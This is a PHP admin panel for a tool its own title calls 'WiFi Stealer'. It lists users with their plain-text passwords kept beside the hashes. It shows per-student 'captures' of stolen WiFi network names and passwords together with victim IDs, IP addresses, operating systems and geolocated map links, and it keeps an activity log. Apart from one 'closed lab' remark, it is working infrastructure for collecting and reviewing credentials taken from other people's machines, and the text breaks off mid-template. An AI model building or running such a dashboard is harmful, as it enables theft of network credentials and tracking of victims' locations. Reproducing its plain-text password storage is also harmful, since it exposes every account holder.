<?php
/**
 * admin.php – Dedicated Admin-Only Control Panel
 * ================================================
 * Accessible ONLY when logged in as an admin.
 * Shows:
 *   1. Overview stats across all users
 *   2. User Credentials Table  – username / email / plain password / role / status
 *   3. Per-Student Captures    – expand each student to see their captured WiFi data
 *   4. Activity Log            – every login / logout / action with IP + timestamp
 */

session_start();
date_default_timezone_set('Asia/Kolkata');

define('USERS_FILE',   __DIR__ . '/users.json');
define('ACTIVITY_LOG', __DIR__ . '/activity.log');
define('CREDS_DIR',    __DIR__ . '/creds');

// ─── GUARD: admin only ───────────────────────────────────────────────────────
if (empty($_SESSION['logged_in']) || ($_SESSION['role'] ?? '') !== 'admin') {
    header('Location: index.php');
    exit;
}

// ─── HELPERS ─────────────────────────────────────────────────────────────────
function h($v): string {
    return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
}

function load_users(): array {
    if (!file_exists(USERS_FILE)) return [];
    return json_decode(file_get_contents(USERS_FILE), true)['users'] ?? [];
}

function save_users(array $users): void {
    file_put_contents(USERS_FILE,
        json_encode(['users' => $users], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
}

function find_user_index(array $users, string $username): int {
    foreach ($users as $i => $u) {
        if (strtolower($u['username']) === strtolower($username)) return $i;
    }
    return -1;
}

function log_activity(string $username, string $action, string $detail = ''): void {
    $ip   = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $line = implode(' | ', [date('Y-m-d H:i:s'), $username, $ip, $action, $detail]);
    file_put_contents(ACTIVITY_LOG, $line . PHP_EOL, FILE_APPEND | LOCK_EX);
}

function user_log_file(string $username): string {
    $safe = preg_replace('/[^a-z0-9_\-]/i', '_', $username);
    return CREDS_DIR . '/' . $safe . '_wifi_creds.log';
}

function parse_capture_line(string $line): ?array {
    $line = trim($line);
    if ($line === '') return null;
    $f = str_getcsv($line);
    if (count($f) < 5) return null;

    $ssid = trim($f[2] ?? '');
    $pass = trim($f[3] ?? '');
    $bad  = ['profile_name','ssid','SSID','IP','OS','Pass','password'];
    if ($ssid === '' || in_array($ssid, $bad, true) || in_array($pass, ['Pass','password'], true)) return null;
    if ($pass === '') $pass = '(Not Found)';

    $ts  = trim($f[0] ?? 'unknown');
    $tsp = $ts;
    if ($ts !== '' && $ts !== 'unknown') {
        $t = strtotime($ts);
        if ($t !== false) $tsp = date('d M Y, h:i A', $t);
    }
    $len  = strlen($pass);
    $weak = $pass !== '(Not Found)' && ($len < 8 || ctype_alpha($pass) || ctype_digit($pass));

    return [
        'time'     => $tsp,
        'time_raw' => $ts,
        'victim'   => trim($f[1] ?? '') ?: 'unknown',
        'ssid'     => $ssid,
        'password' => $pass,
        'weak'     => $weak,
        'ip'       => trim($f[4] ?? '') ?: 'offline',
        'os'       => trim($f[5] ?? '') ?: 'unknown',
        'pub_ip'   => trim($f[6] ?? '') ?: 'unknown',
        'lat'      => trim($f[8] ?? '') ?: 'N/A',
        'lng'      => trim($f[9] ?? '') ?: 'N/A',
    ];
}

// ─── HANDLE POST ACTIONS ─────────────────────────────────────────────────────
$msg = ['type' => '', 'text' => ''];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    // Create user
    if ($action === 'create_user') {
        $uname = trim($_POST['username'] ?? '');
        $upass = $_POST['password'] ?? '';
        $email = trim($_POST['email'] ?? '');
        $role  = in_array($_POST['role'] ?? '', ['admin','student']) ? $_POST['role'] : 'student';

        if ($uname === '' || $upass === '' || $email === '') {
            $msg = ['type'=>'err','text'=>'All fields are required.'];
        } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $msg = ['type'=>'err','text'=>'Invalid email address.'];
        } elseif (strlen($upass) < 6) {
            $msg = ['type'=>'err','text'=>'Password must be at least 6 characters.'];
        } else {
            $users = load_users();
            if (find_user_index($users, $uname) !== -1) {
                $msg = ['type'=>'err','text'=>"Username '{$uname}' already exists."];
            } else {
                $users[] = [
                    'username'       => $uname,
                    'password_hash'  => password_hash($upass, PASSWORD_BCRYPT, ['cost'=>12]),
                    'password_plain' => $upass,
                    'email'          => $email,
                    'role'           => $role,
                    'created_at'     => date('c'),
                    'created_by'     => $_SESSION['login_user'],
                    'active'         => true,
                ];
                save_users($users);
                log_activity($_SESSION['login_user'], 'CREATE_USER', "user={$uname} role={$role} email={$email}");
                $msg = ['type'=>'ok','text'=>"User '{$uname}' created successfully!"];
            }
        }
    }

    // Reset password
    elseif ($action === 'reset_password') {
        $target   = trim($_POST['target'] ?? '');
        $newpass  = $_POST['newpass'] ?? '';
        if ($target !== '' && strlen($newpass) >= 6) {
            $users = load_users();
            $idx   = find_user_index($users, $target);
            if ($idx !== -1) {
                $users[$idx]['password_hash']  = password_hash($newpass, PASSWORD_BCRYPT, ['cost'=>12]);
                $users[$idx]['password_plain'] = $newpass;
                save_users($users);
                log_activity($_SESSION['login_user'], 'RESET_PASSWORD', "target={$target}");
                $msg = ['type'=>'ok','text'=>"Password for '{$target}' updated."];
            }
        } else {
            $msg = ['type'=>'err','text'=>'Password must be at least 6 characters.'];
        }
    }

    // Toggle active
    elseif ($action === 'toggle_user') {
        $target = trim($_POST['target'] ?? '');
        if ($target !== '' && $target !== $_SESSION['login_user']) {
            $users = load_users();
            $idx   = find_user_index($users, $target);
            if ($idx !== -1) {
                $users[$idx]['active'] = !($users[$idx]['active'] ?? true);
                save_users($users);
                $state = $users[$idx]['active'] ? 'ENABLED' : 'DISABLED';
                log_activity($_SESSION['login_user'], 'TOGGLE_USER', "target={$target} state={$state}");
                $msg = ['type'=>'ok','text'=>"User '{$target}' {$state}."];
            }
        } else {
            $msg = ['type'=>'err','text'=>'Cannot disable your own account.'];
        }
    }

    // Delete user
    elseif ($action === 'delete_user') {
        $target = trim($_POST['target'] ?? '');
        if ($target !== '' && $target !== $_SESSION['login_user']) {
            $users = array_values(array_filter(load_users(),
                fn($u) => strtolower($u['username']) !== strtolower($target)));
            save_users($users);
            log_activity($_SESSION['login_user'], 'DELETE_USER', "target={$target}");
            $msg = ['type'=>'ok','text'=>"User '{$target}' deleted."];
        } else {
            $msg = ['type'=>'err','text'=>'Cannot delete your own account.'];
        }
    }

    // Clear student captures
    elseif ($action === 'clear_captures') {
        $target = trim($_POST['target'] ?? '');
        if ($target !== '') {
            $f = user_log_file($target);
            if (file_exists($f)) {
                file_put_contents($f, '');
                log_activity($_SESSION['login_user'], 'CLEAR_CAPTURES', "target={$target}");
                $msg = ['type'=>'ok','text'=>"Captures for '{$target}' cleared."];
            }
        }
    }
}

// ─── LOAD ALL DATA ────────────────────────────────────────────────────────────
$users         = load_users();
$activeTab     = $_GET['tab'] ?? 'overview';
$activityLines = [];

if ($activeTab === 'logs') {
    if (file_exists(ACTIVITY_LOG)) {
        $activityLines = array_reverse(file(ACTIVITY_LOG, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
    }
}

// Aggregate all captures per student
$studentCaptures = [];
$totalCaps  = 0;
$totalWeak  = 0;
$totalUsers = count($users);
$totalStudents = 0;

foreach ($users as $u) {
    if ($u['role'] === 'student') $totalStudents++;
    $logFile = user_log_file($u['username']);
    $caps    = [];
    if (file_exists($logFile)) {
        foreach (file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
            $c = parse_capture_line($line);
            if ($c) {
                $caps[] = $c;
                $totalCaps++;
                if ($c['weak']) $totalWeak++;
            }
        }
    }
    usort($caps, fn($a,$b) => strcmp($b['time_raw'], $a['time_raw']));
    $studentCaptures[$u['username']] = $caps;
}

$adminUser = $_SESSION['login_user'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Admin Panel – WiFi Stealer</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
:root {
  --bg:      #020617;
  --bg2:     #0b1120;
  --bg3:     #0f172a;
  --bg4:     #111827;
  --border:  rgba(148,163,184,.14);
  --text:    #e5e7eb;
  --muted:   #6b7280;
  --accent:  #4f46e5;
  --purple:  #7c3aed;
  --green:   #22c55e;
  --red:     #ef4444;
  --yellow:  #eab308;
  --cyan:    #06b6d4;
}
body { font-family: system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
       background: var(--bg); color: var(--text); display: flex; min-height: 100vh; }

/* ── SIDEBAR ── */
.sidebar {
  width: 220px; min-height: 100vh; background: var(--bg3);
  border-right: 1px solid var(--border);
  display: flex; flex-direction: column;
  position: fixed; top: 0; left: 0; bottom: 0; z-index: 50;
}
.sidebar-head {
  padding: 20px 16px 16px;
  border-bottom: 1px solid var(--border);
}
.sidebar-head .brand { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
.brand-icon {
  width: 34px; height: 34px; border-radius: 8px;
  background: linear-gradient(135deg,#7c3aed,#4f46e5);
  display: flex; align-items: center; justify-content: center; font-size: 16px;
}
.brand-name { font-size: 15px; font-weight: 700; }
.admin-pill {
  display: inline-block; font-size: 10px; padding: 2px 8px; border-radius: 999px;
  background: rgba(239,68,68,.15); color: #fca5a5; border: 1px solid rgba(239,68,68,.3);
  letter-spacing: .5px;
}
.nav { flex: 1; padding: 10px 0; }
.nav a {
  display: flex; align-items: center; gap: 10px; padding: 10px 16px;
  font-size: 13px; color: var(--muted); text-decoration: none;
  border-left: 3px solid transparent; transition: all .15s;
}
.nav a:hover { color: var(--text); background: rgba(255,255,255,.04); }
.nav a.active { color: var(--text); background: rgba(79,70,229,.12); border-left-color: var(--accent); }
.nav .section-label {
  padding: 14px 16px 4px; font-size: 10px; text-transform: uppercase;
  letter-spacing: 1px; color: #374151;
}
.sidebar-foot {
  padding: 12px 16px; border-top: 1px solid var(--border); font-size: 11px;
}
.sidebar-foot .who { font-weight: 600; color: var(--text); font-size: 12px; }
.sidebar-foot .mail { color: var(--muted); font-size: 10px; word-break: break-all; }
.sidebar-foot a { display: block; margin-top: 8px; color: #f87171; font-size: 12px; text-decoration: none; }
.sidebar-foot a:hover { text-decoration: underline; }

/* ── MAIN ── */
.main { margin-left: 220px; flex: 1; padding: 28px; }

/* ── PAGE HEADER ── */
.ph { margin-bottom: 22px; }
.ph h1 { font-size: 22px; font-weight: 700; }
.ph p  { font-size: 13px; color: var(--muted); margin-top: 5px; }

/* ── ALERT ── */
.alert { border-radius: 8px; padding: 10px 14px; font-size: 13px; margin-bottom: 18px;
         display: flex; align-items: center; gap: 8px; }
.alert.ok  { background: rgba(34,197,94,.1); color: #86efac; border: 1px solid rgba(34,197,94,.25); }
.alert.err { background: rgba(239,68,68,.1); color: #fca5a5; border: 1px solid rgba(239,68,68,.3); }

/* ── STAT CARDS ── */
.stat-grid { display: grid; grid-template-columns: repeat(auto-fit,minmax(160px,1fr)); gap: 14px; margin-bottom: 26px; }
.stat {
  background: var(--bg3); border: 1px solid var(--border); border-radius: 12px; padding: 18px;
  position: relative; overflow: hidden;
}
.stat::before {
  content: ''; position: absolute; top: 0; right: 0;
  width: 60px; height: 60px; border-radius: 0 12px 0 60px;
  opacity: .15;
}
.stat.blue::before  { background: var(--accent); }
.stat.purple::before { background: var(--purple); }
.stat.red::before   { background: var(--red); }
.stat.green::before { background: var(--green); }
.stat.cyan::before  { background: var(--cyan); }
.stat .icon { font-size: 22px; margin-bottom: 8px; }
.stat .label { font-size: 11px; color: var(--muted); margin-bottom: 4px; }
.stat .val { font-size: 28px; font-weight: 700; }
.stat.blue   .val { color: #818cf8; }
.stat.purple .val { color: #c4b5fd; }
.stat.red    .val { color: #fca5a5; }
.stat.green  .val { color: #86efac; }
.stat.cyan   .val { color: #67e8f9; }

/* ── PANEL ── */
.panel { background: var(--bg3); border: 1px solid var(--border); border-radius: 12px;
         margin-bottom: 22px; overflow: hidden; }
.panel-head { padding: 16px 20px; border-bottom: 1px solid var(--border);
              display: flex; align-items: center; justify-content: space-between; }
.panel-head h2 { font-size: 14px; font-weight: 600; }
.panel-body { padding: 20px; }

/* ── FORM ── */
.fg { display: flex; flex-direction: column; gap: 5px; }
.fg label { font-size: 12px; color: var(--muted); }
.fg input, .fg select {
  padding: 9px 11px; border-radius: 8px; border: 1px solid #1e293b;
  background: var(--bg2); color: var(--text); font-size: 13px; outline: none;
  transition: border-color .2s;
}
.fg input:focus, .fg select:focus { border-color: var(--accent); }
.form-row { display: grid; grid-template-columns: repeat(auto-fit,minmax(160px,1fr)); gap: 12px; }
.btn {
  display: inline-flex; align-items: center; gap: 6px; padding: 9px 16px;
  border-radius: 8px; border: none; font-size: 12px; font-weight: 500;
  cursor: pointer; transition: opacity .2s; white-space: nowrap;
}
.btn:hover { opacity: .82; }
.btn-primary  { background: linear-gradient(135deg,var(--accent),var(--purple)); color: #fff; }
.btn-warn     { background: rgba(234,179,8,.15); color: #fde047; border: 1px solid rgba(234,179,8,.3); }
.btn-danger   { background: rgba(239,68,68,.15); color: #fca5a5; border: 1px solid rgba(239,68,68,.3); }
.btn-ghost    { background: rgba(255,255,255,.05); color: var(--muted); border: 1px solid var(--border); }
.btn-cyan     { background: rgba(6,182,212,.12); color: #67e8f9; border: 1px solid rgba(6,182,212,.25); }
.btn-sm { padding: 5px 11px; font-size: 11px; border-radius: 6px; }

/* ── TABLE ── */
.tbl-wrap { overflow-x: auto; }
table { width: 100%; border-collapse: collapse; font-size: 12px; }
thead th {
  background: rgba(255,255,255,.03); color: var(--muted); font-weight: 500;
  padding: 11px 14px; text-align: left; border-bottom: 1px solid var(--border);
  white-space: nowrap;
}
tbody tr { border-bottom: 1px solid rgba(148,163,184,.06); transition: background .1s; }
tbody tr:hover { background: rgba(255,255,255,.025); }
tbody td { padding: 10px 14px; vertical-align: middle; }

/* ── BADGES ── */
.badge {
  display: inline-flex; align-items: center; gap: 3px;
  font-size: 10px; padding: 2px 8px; border-radius: 999px; white-space: nowrap;
}
.b-admin    { background: rgba(124,58,237,.2);   color: #c4b5fd; border: 1px solid rgba(124,58,237,.35); }
.b-student  { background: rgba(79,70,229,.18);   color: #818cf8; border: 1px solid rgba(79,70,229,.3);  }
.b-active   { background: rgba(34,197,94,.12);   color: #86efac; border: 1px solid rgba(34,197,94,.25); }
.b-inactive { background: rgba(239,68,68,.12);   color: #fca5a5; border: 1px solid rgba(239,68,68,.25); }
.b-weak     { background: rgba(239,68,68,.15);   color: #fca5a5; border: 1px solid rgba(239,68,68,.3);  }
.b-strong   { background: rgba(34,197,94,.12);   color: #86efac; border: 1px solid rgba(34,197,94,.25); }
.b-na       { background: rgba(107,114,128,.12); color: #9ca3af; border: 1px solid #374151;             }

/* ── PASSWORD FIELD ── */
.pw-wrap { display: flex; align-items: center; gap: 6px; }
.pw-text { font-family: monospace; font-size: 12px; background: rgba(0,0,0,.35);
           border-radius: 5px; padding: 3px 8px; color: #fbbf24; border: 1px solid #292524;
           letter-spacing: 1px; }
.pw-eye { background: none; border: none; color: var(--muted); cursor: pointer;
          font-size: 14px; padding: 2px; line-height: 1; }
.pw-eye:hover { color: var(--text); }

/* ── ACCORDION ── */
.accord { border: 1px solid var(--border); border-radius: 10px; margin-bottom: 10px; overflow: hidden; }
.accord-head {
  display: flex; align-items: center; justify-content: space-between;
  padding: 13px 16px; cursor: pointer; background: var(--bg4);
  transition: background .15s;
}
.accord-head:hover { background: rgba(255,255,255,.04); }
.accord-head .title { font-size: 13px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
.accord-head .meta { display: flex; align-items: center; gap: 8px; font-size: 11px; color: var(--muted); }
.accord-body { display: none; border-top: 1px solid var(--border); overflow-x: auto; }
.accord-body.open { display: block; }
.chevron { transition: transform .2s; display: inline-block; }
.accord-head.open .chevron { transform: rotate(90deg); }

/* ── ACTIVITY LOG ── */
.log-box { max-height: 600px; overflow-y: auto; }
.log-row { display: flex; gap: 0; font-family: monospace; font-size: 11px;
           padding: 5px 14px; border-bottom: 1px solid rgba(255,255,255,.03); }
.log-row:nth-child(even) { background: rgba(255,255,255,.015); }
.log-ts   { color: #374151; min-width: 145px; }
.log-user { color: #818cf8; min-width: 110px; font-weight: 600; }
.log-ip   { color: #4b5563; min-width: 120px; }
.log-act  { min-width: 140px; }
.log-act.login   { color: var(--green); }
.log-act.failed  { color: var(--red); }
.log-act.logout  { color: var(--cyan); }
.log-act.other   { color: var(--yellow); }
.log-detail { color: #374151; }

/* ── MODAL (reset password) ── */
.modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.65);
                 z-index: 200; align-items: center; justify-content: center; }
.modal-overlay.open { display: flex; }
.modal { background: var(--bg3); border: 1px solid var(--border); border-radius: 14px;
         padding: 28px; width: 100%; max-width: 380px; }
.modal h3 { font-size: 16px; margin-bottom: 4px; }
.modal p  { font-size: 12px; color: var(--muted); margin-bottom: 18px; }
.modal .actions { display: flex; gap: 10px; margin-top: 16px; justify-content: flex-end; }

/* ── MISC ── */
.no-data { padding: 30px; text-align: center; color: var(--muted); font-size: 13px; }
code { font-family: monospace; background: rgba(0,0,0,.35); border-radius: 4px;
       padding: 1px 6px; font-size: 12px; color: #fbbf24; }
.cap-count { display: inline-flex; align-items: center; justify-content: center;
             width: 22px; height: 22px; border-radius: 50%; font-size: 11px; font-weight: 700;
             background: rgba(79,70,229,.25); color: #818cf8; }
.cap-count.zero { background: rgba(107,114,128,.15); color: #6b7280; }

@media (max-width: 768px) {
  .sidebar { display: none; }
  .main { margin-left: 0; padding: 16px; }
  .form-row { grid-template-columns: 1fr; }
}
</style>
</head>
<body>

<!-- ──────────── SIDEBAR ──────────── -->
<nav class="sidebar">
  <div class="sidebar-head">
    <div class="brand">
      <div class="brand-icon">🛡️</div>
      <div class="brand-name">Admin Panel</div>
    </div>
    <div class="admin-pill">RESTRICTED ACCESS</div>
  </div>

  <div class="nav">
    <div class="section-label">Control</div>
    <a href="?tab=overview"  class="<?php echo $activeTab==='overview' ?'active':''; ?>">📊 Overview</a>
    <a href="?tab=accounts"  class="<?php echo $activeTab==='accounts' ?'active':''; ?>">🔑 Credentials</a>
    <a href="?tab=captures"  class="<?php echo $activeTab==='captures' ?'active':''; ?>">📡 Student Captures</a>
    <a href="?tab=logs"      class="<?php echo $activeTab==='logs'     ?'active':''; ?>">📋 Activity Log</a>

    <div class="section-label" style="margin-top:12px">Navigation</div>
    <a href="index.php">🏠 Main Dashboard</a>
  </div>

  <div class="sidebar-foot">
    <div class="who">👤 <?php echo h($adminUser); ?></div>
    <div class="mail"><?php echo h($_SESSION['email'] ?? ''); ?></div>
    <a href="index.php?action=logout">⏻ Logout</a>
  </div>
</nav>

<!-- ──────────── MAIN ──────────── -->
<main class="main">

<?php if ($msg['type'] !== ''): ?>
<div class="alert <?php echo $msg['type']; ?>">
  <?php echo $msg['type']==='ok' ? '✅' : '⚠️'; ?> <?php echo h($msg['text']); ?>
</div>
<?php endif; ?>

<!-- ═══════════════════════════════════════════ OVERVIEW ═══ -->
<?php if ($activeTab === 'overview'): ?>

<div class="ph">
  <h1>📊 Admin Overview</h1>
  <p>Real-time summary across all accounts and captures.</p>
</div>

<div class="stat-grid">
  <div class="stat blue">
    <div class="icon">👥</div>
    <div class="label">Total Users</div>
    <div class="val"><?php echo $totalUsers; ?></div>
  </div>
  <div class="stat purple">
    <div class="icon">🎓</div>
    <div class="label">Students</div>
    <div class="val"><?php echo $totalStudents; ?></div>
  </div>
  <div class="stat cyan">
    <div class="icon">📡</div>
    <div class="label">Total Captures</div>
    <div class="val"><?php echo $totalCaps; ?></div>
  </div>
  <div class="stat red">
    <div class="icon">⚠️</div>
    <div class="label">Weak Passwords</div>
    <div class="val"><?php echo $totalWeak; ?></div>
  </div>
  <div class="stat green">
    <div class="icon">📋</div>
    <div class="label">Log Entries</div>
    <div class="val"><?php echo file_exists(ACTIVITY_LOG) ? count(file(ACTIVITY_LOG, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) : 0; ?></div>
  </div>
</div>

<!-- Quick User Summary Table -->
<div class="panel">
  <div class="panel-head"><h2>👥 User Summary</h2></div>
  <div class="tbl-wrap">
    <table>
      <thead>
        <tr>
          <th>Username</th>
          <th>Email</th>
          <th>Role</th>
          <th>Status</th>
          <th>Captures</th>
          <th>Created</th>
        </tr>
      </thead>
      <tbody>
        <?php foreach ($users as $u): $caps = $studentCaptures[$u['username']] ?? []; ?>
        <tr>
          <td><strong><?php echo h($u['username']); ?></strong>
            <?php if ($u['username']===$adminUser): ?><span style="font-size:10px;color:var(--muted)"> (you)</span><?php endif; ?>
          </td>
          <td><?php echo h($u['email'] ?? '—'); ?></td>
          <td><span class="badge <?php echo $u['role']==='admin'?'b-admin':'b-student'; ?>"><?php echo h($u['role']); ?></span></td>
          <td><span class="badge <?php echo ($u['active']??true)?'b-active':'b-inactive'; ?>"><?php echo ($u['active']??true)?'● Active':'○ Disabled'; ?></span></td>
          <td>
            <span class="cap-count <?php echo count($caps)===0?'zero':''; ?>"><?php echo count($caps); ?></span>
          </td>
          <td style="color:var(--muted)"><?php echo $u['created_at'] ? date('d M Y', strtotime($u['created_at'])) : '—'; ?></td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </div>
</div>

<!-- ═══════════════════════════════════════════ CREDENTIALS ═══ -->
<?php elseif ($activeTab === 'accounts'): ?>

<div class="ph">
  <h1>🔑 User Credentials</h1>
  <p>Full account details for all users — username, email, and password. Use responsibly in this closed lab.</p>
</div>

<!-- Create User -->
<div class="panel" style="margin-bottom:22px">
  <div class="panel-head"><h2>➕ Create New Account</h2></div>
  <div class="panel-body">
    <form method="post">
      <input type="hidden" name="action" value="create_user">
      <div class="form-row">
        <div class="fg">
          <label>Username</label>
          <input type="text" name="username" required placeholder="e.g. student01" autocomplete="off">
        </div>
        <div class="fg">
          <label>Password</label>
          <input type="text" name="password" required placeholder="min 6 characters" autocomplete="off">
        </div>
        <div class="fg">
          <label>Email Address</label>
          <input type="email" name="email" required placeholder="student@college.edu">
        </div>
        <div class="fg">
          <label>Role</label>
          <select name="role">
            <option value="student">Student</option>
            <option value="admin">Admin</option>
          </select>
        </div>
      </div>
      <button type="submit" class="btn btn-primary" style="margin-top:16px">➕ Create Account</button>
    </form>
  </div>
</div>

<!-- Credentials Table -->
<div class="panel">
  <div class="panel-head">
    <h2>🔐 All Accounts</h2>
    <span style="font-size:11px;color:var(--muted)"><?php echo count($users); ?> user(s)</span>
  </div>
  <div class="tbl-wrap">
    <table>
      <thead>
        <tr>
          <th>#</th>
          <th>Username</th>
          <th>Email</th>
          <th>Password</th>
          <th>Role</th>
          <th>Status</th>
          <th>Created By</th>
          <th>Created At</th>
          <th>Actions</th>
        </tr>
      </thead>
      <tbody>
        <?php foreach ($users as $i => $u): ?>
        <tr>
          <td style="color:var(--muted)"><?php echo $i+1; ?></td>
          <td>
            <strong><?php echo h($u['username']); ?></strong>
            <?php if ($u['username']===$adminUser): ?><br><span style="font-size:10px;color:#4b5563">(you)</span><?php endif; ?>
          </td>
          <td><?php echo h($u['email'] ?? '—'); ?></td>
          <td>
            <?php $plain = $u['password_plain'] ?? null; ?>
            <?php if ($plain): ?>
            <div class="pw-wrap">
              <span class="pw-text" id="pw-<?php echo $i; ?>" data-val="<?php echo h($plain); ?>" style="filter:blur(4px)">
                <?php echo str_repeat('●', strlen($plain)); ?>
              </span>
              <button class="pw-eye" onclick="togglePw(<?php echo $i; ?>)" title="Show/Hide">👁</button>
            </div>
            <?php else: ?>
            <span style="color:var(--muted);font-size:11px">[hash only – reset to reveal]</span>
            <?php endif; ?>
          </td>
          <td><span class="badge <?php echo $u['role']==='admin'?'b-admin':'b-student'; ?>"><?php echo h($u['role']); ?></span></td>
          <td><span class="badge <?php echo ($u['active']??true)?'b-active':'b-inactive'; ?>"><?php echo ($u['active']??true)?'● Active':'○ Disabled'; ?></span></td>
          <td style="color:var(--muted)"><?php echo h($u['created_by'] ?? '—'); ?></td>
          <td style="color:var(--muted);white-space:nowrap"><?php echo $u['created_at'] ? date('d M Y', strtotime($u['created_at'])) : '—'; ?></td>
          <td>
            <div style="display:flex;gap:6px;flex-wrap:wrap">
              <!-- Reset Password -->
              <button class="btn btn-cyan btn-sm"
                onclick="openReset('<?php echo h($u['username']); ?>')"
                title="Reset Password">🔄 Reset PW</button>

              <?php if ($u['username'] !== $adminUser): ?>
              <!-- Toggle Active -->
              <form method="post" style="display:inline">
                <input type="hidden" name="action" value="toggle_user">
                <input type="hidden" name="target" value="<?php echo h($u['username']); ?>">
                <button class="btn btn-warn btn-sm" type="submit">
                  <?php echo ($u['active']??true)?'🔒 Disable':'🔓 Enable'; ?>
                </button>
              </form>

              <!-- Delete -->
              <form method="post" style="display:inline"
                onsubmit="return confirm('Permanently delete user <?php echo h($u['username']); ?>?')">
                <input type="hidden" name="action" value="delete_user">
                <input type="hidden" name="target" value="<?php echo h($u['username']); ?>">
                <button class="btn btn-danger btn-sm" type="submit">🗑 Delete</button>
              </form>
              <?php endif; ?>
            </div>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </div>
</div>

<!-- ═══════════════════════════════════════════ CAPTURES ═══ -->
<?php elseif ($activeTab === 'captures'): ?>

<div class="ph">
  <h1>📡 Student Captures</h1>
  <p>Click on a student to expand their captured WiFi credentials.</p>
</div>

<?php if (empty($users)): ?>
  <div class="no-data">No users found.</div>
<?php else: ?>
  <?php foreach ($users as $u):
    $caps    = $studentCaptures[$u['username']] ?? [];
    $capCnt  = count($caps);
    $weakCnt = count(array_filter($caps, fn($c) => $c['weak']));
    $ssids   = count(array_unique(array_column($caps, 'ssid')));
  ?>
  <div class="accord">
    <div class="accord-head" onclick="toggleAccord(this)">
      <div class="title">
        <span class="chevron">▶</span>
        <?php echo $u['role']==='admin' ? '🛡️' : '🎓'; ?>
        <strong><?php echo h($u['username']); ?></strong>
        <span style="font-size:11px;color:var(--muted)"><?php echo h($u['email'] ?? ''); ?></span>
        <span class="badge <?php echo $u['role']==='admin'?'b-admin':'b-student'; ?>"><?php echo h($u['role']); ?></span>
      </div>
      <div class="meta">
        <?php if ($capCnt > 0): ?>
          <span style="color:#86efac">📡 <?php echo $capCnt; ?> capture<?php echo $capCnt!==1?'s':''; ?></span>
          <?php if ($weakCnt > 0): ?>
            <span style="color:#fca5a5">⚠ <?php echo $weakCnt; ?> weak</span>
          <?php endif; ?>
          <span style="color:#818cf8">🌐 <?php echo $ssids; ?> SSID<?php echo $ssids!==1?'s':''; ?></span>
        <?php else: ?>
          <span style="color:var(--muted)">No captures yet</span>
        <?php endif; ?>

        <?php if ($capCnt > 0): ?>
        <form method="post" style="display:inline" onclick="event.stopPropagation()"
          onsubmit="return confirm('Clear all captures for <?php echo h($u['username']); ?>?')">
          <input type="hidden" name="action" value="clear_captures">
          <input type="hidden" name="target" value="<?php echo h($u['username']); ?>">
          <button class="btn btn-danger btn-sm" type="submit">🗑 Clear</button>
        </form>
        <?php endif; ?>
      </div>
    </div>

    <div class="accord-body">
      <?php if (empty($caps)): ?>
        <div class="no-data">This user has no captured data yet.</div>
      <?php else: ?>
      <table>
        <thead>
          <tr>
            <th>Time</th>
            <th>SSID</th>
            <th>Password</th>
            <th>Strength</th>
            <th>Victim ID</th>
            <th>IP</th>
            <th>OS</th>
            <th>Public IP</th>
            <th>Location</th>
          </tr>
        </thead>
        <tbody>
          <?php foreach ($caps as $c): ?>
          <tr>
            <td style="white-space:nowrap;color:var(--muted)"><?php echo h($c['time']); ?></td>
            <td><strong><?php echo h($c['ssid']); ?></strong></td>
            <td><code><?php echo h($c['password']); ?></code></td>
            <td>
              <?php if ($c['password']==='(Not Found)'): ?>
                <span class="badge b-na">N/A</span>
              <?php elseif ($c['weak']): ?>
                <span class="badge b-weak">⚠ Weak</span>
              <?php else: ?>
                <span class="badge b-strong">✔ Strong</span>
              <?php endif; ?>
            </td>
            <td style="color:var(--muted)"><?php echo h($c['victim']); ?></td>
            <td style="font-family:monospace;font-size:11px"><?php echo h($c['ip']); ?></td>
            <td><?php echo h($c['os']); ?></td>
            <td style="font-family:monospace;font-size:11px"><?php echo h($c['pub_ip']); ?></td>
            <td>
              <?php if ($c['lat']!=='N/A' && $c['lng']!=='N/A'): ?>
                <a href="https://maps.google.com/?q=<?php echo h($c['lat'].','.$c['lng']); ?>"
                   target="_blank" style="color:#818cf8;font-size:11px">📍 Map</a>
              <?php else: echo '<span style="color:var(--muted)">N/A</span>'; endif; ?>
            </td>
          </tr>
          <?php endforeach; ?>
        </tbody>
      </table>
      <?php endif; ?>
    </div>
  </div>
  <?php endforeach; ?>
<?php endif; ?>

<!-- ═══════════════════════════════════════════ ACTIVITY LOG ═══ -->
<?php elseif ($activeTab === 'logs'): ?>

<div class="ph">
  <h1>📋 Activity Log</h1>
  <p>Every login attempt, logout, user creation, and admin action — with timestamp and IP address.</p>
</div>

<div class="panel">
  <div class="panel-head">
    <h2>Events (newest first)</h2>
    <span style="font-size:11px;color:var(--muted)"><?php echo count($activityLines); ?> entries</span>
  </div>
  <div class="log-box">
    <?php if (empty($activityLines)): ?>
      <div class="no-data">No activity recorded yet.</div>
    <?php else: ?>
      <?php foreach ($activityLines as $line):
        $p   = explode(' | ', $line, 5);
        $ts     = $p[0] ?? '';
        $uname  = $p[1] ?? '';
        $ip     = $p[2] ?? '';
        $action = $p[3] ?? '';
        $detail = $p[4] ?? '';

        $aClass = 'other';
        if (str_contains($action,'LOGIN') && !str_contains($action,'FAILED')) $aClass = 'login';
        elseif (str_contains($action,'FAILED')) $aClass = 'failed';
        elseif (str_contains($action,'LOGOUT')) $aClass = 'logout';
      ?>
      <div class="log-row">
        <span class="log-ts"><?php echo h($ts); ?></span>
        <span class="log-user"><?php echo h($uname); ?></span>
        <span class="log-ip"><?php echo h($ip); ?></span>
